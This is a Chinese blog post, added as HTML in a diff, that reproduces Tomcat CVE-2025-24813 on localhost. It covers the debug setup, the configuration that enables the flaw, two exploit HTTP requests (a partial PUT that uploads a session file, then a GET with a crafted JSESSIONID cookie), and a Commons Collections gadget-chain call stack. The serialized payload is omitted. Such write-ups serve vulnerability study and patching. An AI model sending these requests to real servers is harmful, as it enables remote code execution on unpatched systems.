@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="漏洞简介最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。 PS：这个洞刚出的时候，看到许少发pyq于是看了下，但是因为学校论文和找实习的事拖了俩礼拜没写文章，惨惨（） btw，来个厂子收了我罢 环境搭建有两种调试方法，一种是直接搭建源码调试环境，一种是配置 tomcat 后添加 lib 依赖，分别对应下面两个教程：  郑瀚师傅的源码调试： https">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat CVE-2025-24813 复现">
+<meta property="og:url" content="https://jaspersec.top/posts/2631321160.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="漏洞简介最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。 PS：这个洞刚出的时候，看到许少发pyq于是看了下，但是因为学校论文和找实习的事拖了俩礼拜没写文章，惨惨（） btw，来个厂子收了我罢 环境搭建有两种调试方法，一种是直接搭建源码调试环境，一种是配置 tomcat 后添加 lib 依赖，分别对应下面两个教程：  郑瀚师傅的源码调试： https">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fae30492f9879a8e999dd9915b25a66a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/42aae67182364e8b5a5f694182b025c2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/6f88d54120f1268c7259392db86e737e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/37a94ddbc45a15ad9670d6b6b4424d27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/77e183751c957d2f8e933f4679e9d5de.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3f2af23a0ac6e5e39ae06404e20b7164.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2f779c72684475378787918eb84173b3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/98ca94247dc9e77cbdd13c24c4b9cdff.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2564016aa0d9ec62e04f225b9989453b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5cf6dc82762687137961c82d98babf16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d6c81e3ea0e677d49ae5494e3d3a8feb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7d4f143675d7aec19f8825c7b5d6b283.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ab00435962519c5d07200fd3fcfed3d4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f0fa97923d4f4b5f1346685265688308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/84dc5c7f4270d34b0968b288122d4f34.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ce1dd1e3efd71a6ab7176f30204a0bbe.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8a7c7477437120777634195a67dc124c.png">
+<meta property="article:published_time" content="2025-03-27T09:01:00.000Z">
+<meta property="article:modified_time" content="2025-03-31T22:09:47.242Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fae30492f9879a8e999dd9915b25a66a.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tomcat CVE-2025-24813 复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jasper_sec" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span> 
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/1777878032.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/2631321160.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/2631321160.html&text=Tomcat CVE-2025-24813 复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/2631321160.html&is_video=false&description=Tomcat CVE-2025-24813 复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat CVE-2025-24813 复现&body=Check out this article: https://jaspersec.top/posts/2631321160.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/2631321160.html&name=Tomcat CVE-2025-24813 复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/2631321160.html&t=Tomcat CVE-2025-24813 复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <!-- 
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp"><span class="toc-number">3.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      </div>
+     -->
+    <div id="toc">
+      <div id="toc-div" class="toc-article" >
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp"><span class="toc-number">3.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        
+      </div>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Tomcat CVE-2025-24813 复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-27T09:01:00.000Z" class="dt-published" itemprop="datePublished">2025-03-27</time>
+        
+        (Updated: <time datetime="2025-03-31T22:09:47.242Z" class="dt-updated" itemprop="dateModified">2025-04-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。</p>
+<p>PS：这个洞刚出的时候，看到许少发pyq于是看了下，但是因为学校论文和找实习的事拖了俩礼拜没写文章，惨惨（） <del>btw，来个厂子收了我罢</del></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>有两种调试方法，一种是直接搭建源码调试环境，一种是配置 tomcat 后添加 lib 依赖，分别对应下面两个教程：</p>
+<ol>
+<li>郑瀚师傅的源码调试： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17735106.html">https://www.cnblogs.com/LittleHann/p/17735106.html</a></li>
+<li>idea 部署 tomcat： <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_74312232/article/details/137474027">https://blog.csdn.net/qq_74312232/article/details/137474027</a></li>
+</ol>
+<p>PS：这里采用法二，第一种方法会有各种问题，包括 build error、缺少 java.lang.xxx 等等，可以解决但是会很麻烦。</p>
+<p>法二的大致思路：部署 tomcat-binary ，idea 添加一个 web framework（artifact），然后运行这个 artifact；至于源码调试，直接把 tomcat-binary 的 lib 里的 jar 包全部 add as library 就好，里面还有些小坑，这里详细说一下。</p>
+<p>首先下载 tomcat-binary-9.0.98： <a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip</a></p>
+<p>然后 idea new 一个 空 maven 项目，然后选中项目根目录，双击shift 输入 <code>add framework</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fae30492f9879a8e999dd9915b25a66a.png"></p>
+<p>若成功，则会弹出下面的页面，选择 web 框架并添加，这是帮助我们添加一个适配 tomcat 的 web 目录架构。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/42aae67182364e8b5a5f694182b025c2.png"></p>
+<p>点击 OK 添加后， 目录下会多出一个web目录，web目录下的index.jsp是我们后续会访问的地方。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/6f88d54120f1268c7259392db86e737e.png"></p>
+<p>注意：还需要将 Web 目录添加到 source root，不然会出现 404 Not Found。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/37a94ddbc45a15ad9670d6b6b4424d27.png"></p>
+<p>下面配置 tomcat，右上角 add environment，选择添加 tomcat local server，并进行配置，下面的两个路径都是之前下载的 tomcat-binary 的根目录。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/77e183751c957d2f8e933f4679e9d5de.png"></p>
+<p>注意到右下角有个 Fix，提醒我们添加 artifact，点击 Fix 自动跳转的 Deployment Tab，这里的 Application context 可改可不改，我这里保持原样。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3f2af23a0ac6e5e39ae06404e20b7164.png"></p>
+<p>至此 tomcat 就配置完毕了，点击运行应该会去访问创建的index.jsp，出现一个 END 字样。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2f779c72684475378787918eb84173b3.png"></p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/98ca94247dc9e77cbdd13c24c4b9cdff.png"></p>
+<p>然后为了能够 debug，需要添加 tomat lib 到 idea 里，把 tomcat-binary 目录下的 lib 复制一份到项目根目录，然后右键 add as library 即可。注意：要利用漏洞的话，还需加一个漏洞依赖，例如 CC3.2.1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2564016aa0d9ec62e04f225b9989453b.png"></p>
+<p>打断点<code>org.apache.catalina.servlets.DefaultServlet#doGet</code>，访问<code>http://localhost:8080/CVE_2025_24813_war_exploded/123</code>，成功断下，可调式环境搭建完成。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5cf6dc82762687137961c82d98babf16.png"></p>
+<p>接下来是开启漏洞所需的配置项，不开配置无法上传 session，所以有点鸡肋。</p>
+<p>web.xml</p>
+<figure class="highlight xml"><figcaption><span>title:"web.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>context.xml</p>
+<figure class="highlight xml"><figcaption><span>title:"context.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d6c81e3ea0e677d49ae5494e3d3a8feb.png"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞本质：利用 PUT 协议上传恶意 Session 到服务器，由于服务器读取 Session 是反序列化读取，导致反序列化漏洞。</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
+<li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li>
+<li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li>
+<li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li>
+</ul>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>step1：上传恶意 session 到服务器</p>
+<figure class="highlight http"><figcaption><span>title:"Step1"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /CVE_2025_24813_war_exploded/Jasper_sec/session HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1000  </span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1000/1200  </span><br><span class="line"></span><br><span class="line">此处是java序列化payload，</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7d4f143675d7aec19f8825c7b5d6b283.png"><br>step2：触发 session 反序列化</p>
+<figure class="highlight http"><figcaption><span>title:"Step2"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /CVE_2025_24813_war_exploded/ HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080  </span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.Jasper_sec</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ab00435962519c5d07200fd3fcfed3d4.png"></p>
+<h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>首先是 Session文件的上传，路由处理在 <code>org.apache.catalina.servlets.DefaultServlet#doPut</code>，开头就能看到，如果 <code>readonly=true</code> 的话，会直接 send not allowed，所以需要通过配置文件设置 <code>readonly=false</code>。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f0fa97923d4f4b5f1346685265688308.png"></p>
+<p>然后如果请求里有 <code>Content-Range</code>，并且符合一定规则，就可以进到 else 逻辑，触发<code>DefaultServlet#executePartialPut</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/84dc5c7f4270d34b0968b288122d4f34.png"></p>
+<p><code>org.apache.catalina.servlets.DefaultServlet#executePartialPut</code> 会把文件上传的 tomcat 设置的 tmp 目录里，文件名是把路由的 <code>&quot;/&quot;</code>  替换成 <code>&quot;.&quot;</code>，所以  <code>/Jasper_sec/session</code> 变成了 <code>.Jasper_sec.session</code>，实现了 Session  文件的上传。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ce1dd1e3efd71a6ab7176f30204a0bbe.png"></p>
+<p>然后是触发 Session 反序列化，这个也很简单，就是读取 Cookie 的 JSESSIONID 然后做拼接，可以看这个 load 函数，逻辑会很清晰：<code>org.apache.catalina.session.FileStore#load</code>，包括拼接文件名，然后执行对文件内容反序列化。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8a7c7477437120777634195a67dc124c.png"><br>函数调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">transform:120, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">doReadObject:1199, StandardSession (org.apache.catalina.session)</span><br><span class="line">readObjectData:846, StandardSession (org.apache.catalina.session)</span><br><span class="line">load:203, FileStore (org.apache.catalina.session)</span><br><span class="line">loadSessionFromStore:723, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">swapIn:672, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">findSession:467, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">doGetSession:2723, Request (org.apache.catalina.connector)</span><br><span class="line">getSessionInternal:2468, Request (org.apache.catalina.connector)</span><br><span class="line">invoke:452, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:130, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:93, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:346, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:396, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:63, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:52, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp"><span class="toc-number">3.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/2631321160.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/2631321160.html&text=Tomcat CVE-2025-24813 复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/2631321160.html&is_video=false&description=Tomcat CVE-2025-24813 复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
